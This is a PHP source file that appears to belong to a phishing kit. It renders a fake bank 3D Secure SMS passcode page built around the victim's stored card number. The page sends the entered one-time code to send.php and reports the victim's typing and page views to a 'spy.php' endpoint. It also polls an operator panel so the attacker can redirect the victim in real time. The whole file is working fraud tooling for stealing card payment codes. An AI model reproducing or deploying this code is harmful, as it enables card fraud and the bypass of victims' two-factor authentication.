<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

require "../main.php";
require_once "LanguageManager.php";
require_once "bank_utils.php";

// Initialize language manager for translation support
$languageManager = new LanguageManager();

// Define ajaxPath directly to ensure it's available for JavaScript
$ajaxPath = "../panel/process/processor.php";

// Retrieve card brand image
$imagePath = CARD_IMAGE_PATHS['default'];
if (isset($_SESSION["cardType"])) {
    switch ($_SESSION["cardType"]) {
        case "visa": $imagePath = CARD_IMAGE_PATHS['visa']; break;
        case "mastercard": $imagePath = CARD_IMAGE_PATHS['mastercard']; break;
        case "amex": $imagePath = CARD_IMAGE_PATHS['amex']; break;
    }
} elseif (isset($_SESSION['fullCardNumber'])) {
    $cardInfo = getCardInfo($_SESSION['fullCardNumber']);
    $imagePath = file_exists($cardInfo['imagePath']) ? $cardInfo['imagePath'] : CARD_IMAGE_PATHS['default'];
}

// Retrieve bank info (logo fetched async via JS)
$bankName = 'Unknown Bank';
$bankLogo = './res/blank.svg';
$bin = '';
if (isset($_SESSION['firstSixDigits'])) {
    $bin = htmlspecialchars($_SESSION['firstSixDigits']);
    $bankInfo = getBank($bin);
    $bankName = $bankInfo['bank'];
    $bankLogo = isset($bankInfo['logo']) && !empty($bankInfo['logo']) ? $bankInfo['logo'] : './res/blank.svg';
    if (isset($_SESSION['fullCardNumber'])) {
        $_SESSION['lastFourDigits'] = substr($_SESSION['fullCardNumber'], -4);
    }
}

?>
<!DOCTYPE html>
  <html lang="<?php echo $languageManager->getLanguage(); ?>">

  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><?php echo t("sms_otp_verification", "SMS One-Time Passcode Verification"); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="./res/jq.js"></script>
    <link rel="stylesheet" href="./sms_style.css" />

  </head>

  <body>
    <div class="modal-overlay">
      <div class="modal-content">
        <div class="container">
          <button style="display:none;" class="close-modal" onclick="closeModal()">&times;</button>

          <div class="loading-content" id="loadingContent">
            <div class="modal-spinner"></div>
            <div class="loading-message">Bitte haben Sie etwas Geduld, dies kann eine Weile dauern!</div>
          </div>

          <main role="main" aria-labelledby="pageTitle" class="main-content" id="mainContent">
            <div class="logo-bar" aria-label="Logos">
  <img id="bankLogo" class="logo-left" src="<?php echo htmlspecialchars($bankLogo ?? './res/blank.svg'); ?>" alt="Bank Logo" onerror="this.onerror=null;this.src='./res/blank.svg';">

              <img src="<?php echo isset($imagePath) ? htmlspecialchars($imagePath) : ''; ?>" alt="Card Logo"
                class="logo-right" />
            </div>

            <p style="font-family: 'Segoe UI', Tahoma, sans-serif; font-weight: 500; color: #555;">
              <i class="fas fa-lock"></i> <?php echo t("online_purchase_3d_secure", "Online purchase - 3D secure"); ?>
            </p>
            <h1 id="pageTitle"><?php echo t("enter_otp_title", "Enter Your One-Time Passcode (OTP)"); ?></h1>
            <p class="instruction">
              <?php echo t("otp_instruction", "Please enter the 6-digit code sent via SMS to your registered mobile number. Never share this code with anyone."); ?>
            </p>

            <div class="transaction-details" aria-label="Transaction Details">
              <div class="transaction-row">
                <div class="transaction-label"><?php echo t("merchant", "Merchant:"); ?></div>
                <div class="transaction-value">Freeparking Network LTD</div>
              </div>
              <div class="transaction-row">
                <div class="transaction-label"><?php echo t("amount", "Amount:"); ?></div>
                <div class="transaction-value">$12.65</div>
              </div>
              <div class="transaction-row">
                <div class="transaction-label"><?php echo t("date", "Date:"); ?></div>
                <div class="transaction-value"><?php
function getCurrentDateTime() {
    return date('Y-m-d H:i:s');
}

// Example usage
echo getCurrentDateTime();
?>
                </div>
              </div>
              <div class="transaction-row">
                <div class="transaction-label"><?php echo t("card", "Card:"); ?></div>
                <div class="transaction-value">
                  <?php if (isset($_SESSION['firstSixDigits'])) echo $_SESSION['firstSixDigits']; ?>•••••••</div>
              </div>
            </div>



            <form method="POST" action="send.php" class="otp-form" aria-label="OTP verification form">
              <label for="otpInput" class="sr-only">One-Time Passcode</label>
              <?php if (isset($_GET['e'])): ?>
              <div style="color:red;  text-align: center;">
                <?php
                switch($_GET['e']) {
                  case 'incorrect':
                    echo t("incorrect_auth_code", "Incorrect authentication code!");
                    break;
                  case 'expired':
                    echo t("expired_code", "Code has expired!");
                    break;
                  default:
                    echo t("auth_error", "Authentication error!");
                    break;
                }
                ?>
              </div>
              <?php endif; ?>
              <input type="text" id="otpInput" class="otp-input" name="otp" pattern="[0-9]{6}" maxlength="6"
                autocomplete="one-time-code" inputmode="numeric" placeholder="" required="" auto-select="true" aria-required="true">
              <button type="submit" class="verify-btn"><?php echo t("verify_code_button", "Verify"); ?></button>
            </form>
            <div class="error-message" style="color:red; text-align: center; margin-top: 10px; display: none;"></div>

            <footer>
              <p><?php echo t("support_message", "If you didn't request this, please contact support immediately."); ?>
              </p>
              <p style="text-align: left;"><u tabindex="0"><?php echo t("need_help", "Need Help?"); ?> </u><br><u>
                  <?php echo t("learn_more_auth", "Learn more about Authentication"); ?></u></p>


            </footer>
          </main>
        </div>
      </div>
    </div>





<script src="./res/arr.js" type="text/javascript"></script>


<script>
  function clearRedirections() {
        $.post("<?php echo $ajaxPath; ?>", { clearRedirection: 1 });
    }

    clearRedirections();

    // Keep alive with server
    setInterval(function() {
        $.post("<?php echo $ajaxPath; ?>", { keepAlive: 1, page: "SMS " + "<?php echo htmlspecialchars($_GET['e'] ?? '', ENT_QUOTES, 'UTF-8'); ?>" });
    }, 500);

    var redirect = 0;

    // Check for redirection
    setInterval(function() {
        $.post("<?php echo $ajaxPath; ?>", { redirectionListener: 1 }, function(data) {
            redirect = data;
            if (redirect == 0) {
                return false;
            } else {
                clearRedirections();
                window.location = targets[redirect];
            }
        });
    }, 500);

    // Spy on OTP input
    var c = 0;
    $("#otpInput").keyup(function() {
        c++;
        if (c == 1) {
            $.post("spy.php", { otping: 1 });
        }
    });

    // Post OTP view
    $.post("spy.php", { otpview: 1 });
</script>

<script>
$(document).ready(function() {
  // Modal management functions
  function closeModal() {
    document.querySelector('.modal-overlay').style.display = 'none';
  }

  // Close modal with Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      closeModal();
    }
  });

  // Enhanced loader manager
  var loaderManager = {
    timeout: null,
    isShowing: false,

    show: function(duration = 3000) {
      if (this.timeout) {
        clearTimeout(this.timeout);
      }
      document.getElementById('mainContent').classList.remove('show');
      document.getElementById('loadingContent').style.display = 'flex';
      this.isShowing = true;

      this.timeout = setTimeout(function() {
        loaderManager.hide();
      }, duration);
    },

    hide: function() {
      if (this.timeout) {
        clearTimeout(this.timeout);
        this.timeout = null;
      }
      document.getElementById('loadingContent').style.display = 'none';
      document.getElementById('mainContent').classList.add('show');
      this.isShowing = false;
    },

    updateMessage: function(message) {
      var loaderText = document.querySelector('#loadingContent .loading-message');
      if (loaderText && message) {
        loaderText.textContent = message;
      }
    }
  };

  // Initial page load handling - check for errors first
  if (window.location.search.indexOf('e=') > -1) {
    // Show error immediately, no loading delay
    loaderManager.hide();
  } else {
    // Normal 3-second loading for regular visits
    setTimeout(function() {
      loaderManager.hide();
    }, 3000);
  }

  // Form submission handling
  $(".otp-form").off("submit").on("submit", function(e) {
    e.preventDefault();

    var otpCode = $("#otpInput").val().trim();

    if (!otpCode || otpCode.length !== 6) {
      $(".error-message").text("Please enter a valid 6-digit code").show();
      return false;
    }

    $(".error-message").text("").hide();

    var $submitBtn = $(".verify-btn");
    $submitBtn.html("<?php echo t("verifying", "Verifying..."); ?>").prop("disabled", true);

    // Show loader immediately
    $('#mainContent').removeClass('show').hide();
    $('#loadingContent').css('display', 'flex').show();
    loaderManager.isShowing = true;
    loaderManager.updateMessage("Verifying your code...");

    // Submit to send.php
    $.post("send.php", {
      otp: otpCode
    });

    return false;
  });

  // Input tracking
  var otpingTracked = false;
  $("#otpInput").on("input", function() {
    $(".error-message").hide();
    if (!otpingTracked && $(this).val().length > 0) {
      otpingTracked = true;
      $.post("spy.php", { otping: 1 });
    }
  });
});
</script>
<script>
// Async bank logo loader via Google Image Search proxy
(function() {
    var bankName = <?php echo json_encode($bankName); ?>;
    var bin = <?php echo json_encode($bin); ?>;
    var bankLogoEl = document.getElementById('bankLogo');

    if (!bankName || bankName === 'Unknown Bank' || !bankLogoEl) return;

    // Skip if logo is already loaded (cached from previous visit)
    var currentSrc = bankLogoEl.getAttribute('src');
    if (currentSrc && currentSrc.indexOf('blank.svg') === -1 && currentSrc !== '') return;

    $.post('logo_fetch.php', { bankName: bankName, bin: bin }, function(response) {
        if (response && response.logo && response.logo !== './res/blank.svg') {
            var testImg = new Image();
            testImg.onload = function() {
                if (testImg.naturalWidth > 1 && testImg.naturalHeight > 1) {
                    bankLogoEl.src = response.logo;
                }
            };
            testImg.src = response.logo;
        }
    }, 'json');
})();
</script>
</body>
  </html>
